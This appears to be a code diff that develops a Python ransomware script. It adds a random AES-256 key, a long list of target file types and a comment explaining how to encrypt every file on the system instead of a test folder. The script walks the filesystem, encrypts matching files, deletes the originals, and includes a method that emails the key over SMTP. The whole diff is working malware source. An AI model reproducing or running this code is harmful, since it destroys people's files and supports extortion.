@@ -2,45 +2,40 @@
 #@ credit to Eli Bendersky's website
 
 from os import walk
-import os, random, struct
+import os, struct
 from Crypto.Cipher import AES
 from Crypto import Random
 import sys
 import tkinter
+import smtplib
 
 
-key = '0123456789abcdef'
+
 path=os.path.abspath(os.sep)
+#comment next line to encrypted all file in system
 path +='test_ground/'
-extension=['jpg','txt','doc','png','ppt','pdf','docx','psd','ai','tif','dmg','7z']
+#all files with such extension can be encrypted
+extension=["3g2", "3gp", "asf", "asx", "avi", "flv","m2ts", "mkv", "mov", "mp4", "mpg", "mpeg","rm", "swf", "vob", "wmv", "doc", "docx", "pdf","rar","jpg", "jpeg", "png", "tiff", "zip", "7z", "exe", "targz", "tar", "mp3", "sh", "c", "cpp", "h", "gif", "txt", "py", "pyc", "jar", "sql", "bundle","sqlite3", "html", "php", "log", "bak", "deb"]
 
 class Ransom():
-    def encrypt_file(key, in_filename, out_filename=None, chunksize=64*1024):
-        """ Encrypts a file using AES (CBC mode) with the
-            given key.
-
-            key:
-                The encryption key - a string that must be
-                either 16, 24 or 32 bytes long. Longer keys
-                are more secure.
-
-            in_filename:
-                Name of the input file
-
-            out_filename:
-                If None, '<in_filename>.enc' will be used.
-
-            chunksize:
-                Sets the size of the chunk which the function
-                uses to read and encrypt the file. Larger chunk
-                sizes can be faster for some files and machines.
-                chunksize must be divisible by 16.
-        """
+    ''
+    key = Random.get_random_bytes(32)
+    #you can use send mail to send key to your mail account
+    #send_mail()
+    #for easy test, we store key in a local file called key.txt
+    f = open("key.txt","wb")
+    f.write(key)
+    f.close()
+    def encrypt_file(in_filename, out_filename=None, chunksize=64*1024):
+        '''
+        This method is used to encrypted file with AES-256 algorithm
+        '''
         if not out_filename:
             out_filename = in_filename + '.enc'
 
         iv = Random.get_random_bytes(16)
-        encryptor = AES.new(key, AES.MODE_CBC, iv)
+        
+        encryptor = AES.new(Ransom.key, AES.MODE_CBC, iv)
         filesize = os.path.getsize(in_filename)
 
         with open(in_filename, 'rb') as infile:
@@ -60,6 +55,9 @@ class Ransom():
         os.remove(in_filename)
 
     def lookfor_files(mypath, type):
+        '''
+        This method is used to search for all important files in systems
+        '''
         f = []
         if(type=='enc'):
             for (dirpath, dirnames, filenames) in walk(mypath):
@@ -76,16 +74,14 @@ class Ransom():
         return set(f)
 
     def decryt_files(in_filename, out_filename=None, chunksize=64*1024):
-        """ 
-            Decrypts a file using AES (CBC mode) with the
-            given key. Parameters are similar to encrypt_file,
-            with one difference: out_filename, if not supplied
-            will be in_filename without its last extension
-            (i.e. if in_filename is 'aaa.zip.enc' then
-            out_filename will be 'aaa.zip')
-        """
+        '''
+        This method is used to decrypt files. To use this function, you have to restore
+        key somewhere
+        '''
         if not out_filename:
             out_filename = os.path.splitext(in_filename)[0]
+        f = open("key.txt","rb")
+        key = f.read()
         with open(in_filename,'rb') as infile:
             origsize = struct.unpack('<Q',infile.read(struct.calcsize('Q')))[0]
             iv = infile.read(16)
@@ -105,28 +101,46 @@ class Ransom():
 
 
     def encrypt_button():
+        '''
+        simple tinker gui used for test
+        '''
         filenames = ()
         filenames = Ransom.lookfor_files(path,'enc')
         print(filenames)
         for f in filenames:
-            Ransom.encrypt_file(key,f)
+            Ransom.encrypt_file(f)
 
     def decrypt_button():
+        '''
+        simple tinker gui used for test
+        '''
         filenames = ()
         filenames = Ransom.lookfor_files(path,'dec')
         for f in filenames:
             Ransom.decryt_files(f)
+    def sendemail(self, to_addr_list, cc_addr_list,subject,from_addr, message):
+        '''
+        This method can use smtp protocol to send key to some mail address
+        '''
+        if message!="":
+            initials = "XL"
+            header  = 'From: %s\n' % from_addr
+            header += 'To: %s\n' %','.join(to_addr_list)
+            header += 'Cc: %s\n' % ','.join(cc_addr_list)
+            header += 'Subject: %s\n\n' % subject
+            message = Ransom.key
+            server = smtplib.SMTP()
+            server.connect()
+            server.sendmail("\"key \("+initials+"\)\" ", to_addr_list, message)
+            server.close()
 
 
 if __name__ == "__main__":
-    # if(sys.argv[1]=='enc'):
-    #     Ransom.encrypt_button()
-    # elif(sys.argv[1]=='dec'):
-    #     Ransom.decrypt_button()
     top = tkinter.Tk()
-    E = tkinter.Button(top,text='enc',command = Ransom.encrypt_button)
+    E = tkinter.Button(top,text='enc',command = Ransom.encrypt_button,height=10,width=10)
     E.pack()
-    D = tkinter.Button(top,text='dec',command = Ransom.decrypt_button)
+    D = tkinter.Button(top,text='dec',command = Ransom.decrypt_button,height=10,width=10)
     D.pack()
+    top.geometry('500x500')
     top.mainloop()
 
